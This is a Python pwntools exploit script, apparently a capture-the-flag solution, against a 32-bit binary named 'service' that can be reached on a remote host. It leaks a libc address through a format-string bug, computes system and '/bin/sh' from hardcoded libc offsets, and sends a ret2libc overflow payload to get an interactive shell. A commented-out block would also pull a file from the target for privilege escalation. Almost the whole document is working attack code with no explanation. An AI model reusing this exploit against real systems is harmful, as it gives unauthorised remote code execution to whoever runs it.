#!/usr/bin/env python3

from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 26726)

    return r

# libc6-i386_2.28-10_amd64
libc_config = {
    'io_2_1_stdin': 0x001da5c0,
    'system': 0x0003e9e0,
    'str_bin_sh': 0x17eaaa,
}

def main():
    r = conn()

    r.recvuntil(': ')
    r.sendline(b'%2$p-' + asm(shellcraft.sh()))
    greeting = r.recvuntil(': ')
    leaked_io_2_1_stdin = int(greeting.split(b'-')[0].split(b' ')[-1].decode(), 16)
    libc_address = leaked_io_2_1_stdin - libc_config['io_2_1_stdin']

    sys = p32(libc_address + libc_config['system'])
    sh = p32(libc_address + libc_config['str_bin_sh'])
    r.sendline(flat({49: sys + p32(0xcafebabe) + sh}))

    # For PrivEsc
    '''with open('readline', 'wb') as f:
        r.sendline('cat /bin/readline')
        r.sendline('exit')
        f.write(r.recvall())'''

    r.interactive()

if __name__ == "__main__":
    main()
